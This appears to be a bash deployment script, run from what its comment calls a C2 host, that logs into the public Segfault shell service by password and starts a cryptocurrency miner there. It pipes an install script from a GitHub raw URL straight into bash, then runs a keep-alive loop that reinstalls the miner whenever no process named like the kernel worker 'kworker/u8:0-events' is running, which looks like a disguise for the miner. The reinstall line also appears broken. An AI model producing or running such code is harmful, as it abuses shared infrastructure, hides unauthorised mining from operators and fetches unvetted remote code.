#!/bin/bash
# Run on C2. Holds Segfault SSH open and starts the miner inside.
# Do not put SECRET in the public GitHub repo — export it on C2 only.
set -euo pipefail
: "${SF_HOST:=lsd.segfault.net}"
: "${SF_USER:=root}"
: "${SF_PASS:=segfault}"
: "${SF_SECRET:?set SF_SECRET}"

INSTALL='curl -fsSL https://raw.githubusercontent.com/andreamiri354-lab/veron/main/install.sh | bash'

export SSHPASS="$SF_PASS"
exec sshpass -e ssh -tt \
  -o StrictHostKeyChecking=accept-new \
  -o ServerAliveInterval=30 \
  -o ServerAliveCountMax=4 \
  -o ExitOnForwardFailure=no \
  -o SetEnv="SECRET=${SF_SECRET}" \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  "${SF_USER}@${SF_HOST}" \
  "bash -lc '$INSTALL; echo KEEPALIVE; while true; do pgrep -f kworker/u8:0-events >/dev/null || bash $INSTALL; sleep 45; done'"
